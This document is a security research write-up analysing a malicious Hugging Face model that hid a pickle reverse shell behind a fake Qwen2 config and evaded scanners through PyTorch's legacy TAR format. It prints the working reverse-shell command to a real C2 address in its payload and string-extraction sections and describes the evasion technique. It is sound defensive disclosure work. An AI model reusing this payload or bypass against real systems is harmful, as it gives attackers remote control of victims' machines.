# Reverse Shell Malware Found on Hugging Face: Analysis of LQCTestingSpace/lqc_model

**Date:** March 30, 2026
**Classification:** MALICIOUS — Reverse Shell
**Status:** Reported to Hugging Face Security and AWS Trust & Safety. Model removed.

---

## TL;DR

A malicious model on Hugging Face disguised as a Qwen2 language model contained no real weights — just a 10.2 KB pickle payload that opens a reverse shell to an attacker-controlled AWS EC2 instance in Singapore. It sat on the platform for 3 days, was downloaded 108 times, and **every scanner on the platform either returned "No issue" or was still queued**. The model used PyTorch's legacy TAR-based loading path, a known scanner bypass technique that, to our knowledge, had never been seen in the wild before this case.

---

## Indicators of Compromise

| Indicator | Value |
|---|---|
| Model URL | `https://huggingface.co/LQCTestingSpace/lqc_model` (removed) |
| Malicious file | `pytorch_model.bin` |
| File size | 10,240 bytes (10.2 KB) |
| File format | TAR archive containing pickle payload |
| C2 IP | `18.138.220.214` |
| C2 port | `11014/tcp` |
| C2 hosting | Amazon Data Services Singapore (AWS EC2, `ap-southeast-1`) |
| C2 netblock | `18.138.0.0/15` (AMAZON-SIN) |
| Uploader | NoSpaceAvailable |
| Organization | LQCTestingSpace |
| Downloads | 108 (at time of report) |
| Upload date | March 27, 2026 |
| Reported | March 30, 2026 |

---

## The Payload

The pickle payload embedded in `pytorch_model.bin` executes the following command on deserialization:

```python
__import__("os").system("bash -c 'bash -i >& /dev/tcp/18.138.220.214/11014 0>&1'")
```

This is a standard bash reverse shell:
1. Imports `os`
2. Calls `os.system()` to run a shell command
3. Launches an interactive bash session (`bash -i`)
4. Redirects stdin, stdout, and stderr to a TCP connection to the C2 server

If the C2 server is listening, the attacker gets a fully interactive shell on the victim's machine with the victim's user privileges.

---

## Why Scanners Missed It

### The evasion technique: Legacy TAR loading path

The file is **not** a standard ZIP-based PyTorch checkpoint. It begins with the bytes `storages` followed by a `ustar` TAR header at offset `0x100`, identifying it as a **TAR archive** — the legacy format used by older versions of `torch.save()`.

This matters because every existing static scanner (PickleScan, ModelScan, Hugging Face's built-in scanner, ProtectAI) expects the modern ZIP-based container format. When they encounter a TAR-based file, they either fail to parse it or skip it entirely. **PyTorch's `torch.load()` handles both formats transparently** — the framework loads the TAR, extracts the pickle stream, and executes the payload. The scanners never see it.

This loading path bypass was [documented by Liu et al.](https://arxiv.org/abs/2412.15100) as one of 22 evasion paths that defeat all four major static scanners. **This is its first known use in the wild.**

### Scanner results at time of discovery

All scanner results on Hugging Face showed either "No issue" or "Queued" — the model was fully downloadable and executable with no security warning attached.

---

## The Disguise

The repository included a `config.json` claiming the following architecture:

```json
{
  "architectures": ["Qwen2ForCausalLM"],
  "hidden_size": 896,
  "num_hidden_layers": 24
}
```

A legitimate Qwen2 model with these parameters would require approximately **300 MB** of weights. The actual file was **10.2 KB** — roughly **30,000x smaller** than expected. The `config.json` exists solely to make the model loadable via `transformers.AutoModel.from_pretrained()`.

---

## Static Analysis

### String extraction

The following strings were extracted from the binary:

```
storages
builtins
R__import__("os").system("bash -c 'bash -i >& /dev/tcp/18.138.220.214/11014 0>&1'")
tensors
```

The `builtins` reference and the `R` (pickle REDUCE opcode) confirm this is a pickle-based code execution payload. The reverse shell command is visible in plaintext.

---

## Runtime Behavior

The following syscalls were observed when the model was loaded in a controlled environment:

### Loading phase

| Timestamp | Syscall | Target | Details |
|---|---|---|---|
| 133143.889220 | `socket()` | AF_UNIX/SOCK_STREAM | Unix socket created |
| 133143.889234 | `connect()` | Unix socket fd 314 | Local name service connection |
| 133143.889298 | `openat()` | `/etc/nsswitch.conf` | Name service config read |
| 133143.889320 | `read()` | `/etc/nsswitch.conf` | 4096 bytes read |

### Execution phase

| Timestamp | Syscall | Target | Details |
|---|---|---|---|
| 133143.914240 | `execve()` | `/usr/bin/bash` | **Shell spawned** |
| 133143.918546 | `socket()` | AF_INET/SOCK_STREAM/TCP | TCP socket created |
| 133143.918560 | `connect()` | `18.138.220.214:11014` | **C2 connection** |

**Total time from deserialization to C2 connection: ~29 milliseconds.**

---

## Commit History

The repository contained 12 commits from a single author, all dated March 27–28, 2026:

| # | Date / Time | Message |
|---|---|---|
| 1 | Mar 27, 09:50 | initial commit |
| 2 | Mar 27, 09:50 | Upload folder using huggingface_hub |
| 3 | Mar 27, 11:02 | Upload folder using huggingface_hub |
| 4 | Mar 27, 11:11 | Upload folder using huggingface_hub |
| 5 | Mar 27, 11:13 | Upload folder using huggingface_hub |
| 6 | Mar 27, 11:21 | Upload folder using huggingface_hub |
| 7 | Mar 27, 11:24 | Upload folder using huggingface_hub |
| 8 | Mar 28, 14:50 | Upload folder using huggingface_hub |
| 9 | Mar 28, 14:52 | Upload folder using huggingface_hub |
| 10 | Mar 28, 14:56 | Upload folder using huggingface_hub |
| 11 | Mar 28, 15:00 | Upload folder using huggingface_hub |
| 12 | Mar 28, 15:01 | Upload folder using huggingface_hub |

Two development sessions: 6 commits on March 27 over ~1.5 hours, then 5 rapid commits on March 28 within 11 minutes. This pattern indicates the attacker was iterating on the payload.

---

## Attack Scenario

```
Step 1: Attacker creates LQCTestingSpace org on Hugging Face
        Uploads pytorch_model.bin containing pickle reverse shell

Step 2: config.json claims Qwen2ForCausalLM architecture
        Model appears legitimate and loads via transformers

Step 3: Victim loads the model:
        >>> from transformers import AutoModel
        >>> model = AutoModel.from_pretrained("LQCTestingSpace/lqc_model")

Step 4: torch.load() deserializes the pickle → triggers os.system()

Step 5: Bash reverse shell connects to 18.138.220.214:11014

Step 6: Attacker gets interactive shell with victim's privileges
```

---

## C2 Infrastructure

| Field | Value |
|---|---|
| IP address | `18.138.220.214` |
| Net range | `18.138.0.0 – 18.139.255.255` |
| Net name | AMAZON-SIN |
| Organization | Amazon Data Services Singapore (ADSS-3) |
| Location | Singapore (049481) |
| Abuse contact | `trustandsafety@support.aws.com` |

Port 11014 is a non-standard port commonly used by attackers to avoid basic firewall rules and network monitoring.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| March 27, 2026 | Model uploaded to Hugging Face |
| March 30, 2026 | Discovered and reported to Hugging Face Security and AWS Trust & Safety |
| Post-report | Model removed from platform |

---

## Key Takeaways

- **ML models are executable artifacts.** Loading a model from a public hub can execute arbitrary code on your machine. This is not theoretical — it happened here.
- **Static scanners missed it.** Every scanner on Hugging Face failed to flag a plaintext reverse shell because the payload was wrapped in a TAR archive that scanners cannot parse, even though PyTorch loads it without issue.
- **Published bypass techniques are being used in the wild.** The legacy TAR loading path was documented as a scanner evasion technique in academic research. This is the first confirmed case of it being deployed against a real platform.
- **File size is a signal.** A 10.2 KB file claiming to be a 24-layer language model is a 30,000x size mismatch. Simple metadata validation would have flagged this immediately.
- **29 milliseconds.** That's how long it takes from `from_pretrained()` to an open reverse shell. There is no window for manual intervention.

---

## About

This analysis was conducted as part of research on runtime behavioral detection of malicious ML models. The detection was made using [ModelShield](https://github.com/HalaAli198/ModelShield), a runtime behavioral detection system that monitors system-call activity during model loading and inference.

**Authors:** Hala Ali (Virginia Commonwealth University), Andrew Case (Volatility Foundation)
